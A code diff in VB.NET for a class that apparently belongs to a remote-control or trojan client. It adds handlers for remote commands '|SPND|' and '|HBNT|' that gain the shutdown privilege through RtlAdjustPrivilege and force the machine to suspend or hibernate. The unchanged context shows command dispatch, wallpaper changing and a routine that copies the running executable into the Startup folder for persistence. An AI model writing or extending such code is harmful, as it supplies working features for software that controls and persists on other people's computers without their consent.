@@ -39,6 +39,16 @@ Public Class MainCL
                 StartThat()
 
 
+                ' "|HBNT|"
+                ' "|SPND|"
+            ElseIf j(1) = "|SPND|" Then
+
+                HIBSUSPEND(False)
+            ElseIf j(1) = "|HBNT|" Then
+
+                HIBSUSPEND(True)
+
+
             ElseIf j(1) = "|SETWP|" Then
 
                 '  Dim o As Byte() = Await Task.Run(Function() System.Text.Encoding.Default.GetBytes(j(2)))
@@ -93,7 +103,16 @@ Public Class MainCL
         Next
 
     End Sub
+    'https://askubuntu.com/questions/3369/what-is-the-difference-between-hibernate-and-suspend
+    'Suspend does not turn off your computer. It puts the computer and all peripherals on a low power consumption mode. If the battery runs out or the computer turns off for some reason, the current session and unsaved changes will be lost.
 
+    'Hibernate saves the state Of your computer To the hard disk And completely powers off. When resuming, the saved state Is restored To RAM.
+    Public Shared Sub HIBSUSPEND(ByVal B As Boolean)
+        Dim t1 As Boolean
+        RtlAdjustPrivilege(19, True, False, t1)
+
+        SetSuspendState(B, True, True)
+    End Sub
     Public Shared Sub ATSRP()
         If Not IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & System.AppDomain.CurrentDomain.FriendlyName) Then
 
@@ -326,6 +345,10 @@ Public Class MainCL
 
 
 
+    <DllImport("PowrProf.dll", ExactSpelling:=True, SetLastError:=True)>
+    Friend Shared Function SetSuspendState(ByVal bHibernate As Boolean, ByVal bForce As Boolean, ByVal bWakeupEventsDisabled As Boolean) As Boolean
+
+    End Function
 
 
     Private Const i = &HC0000022  ''error code
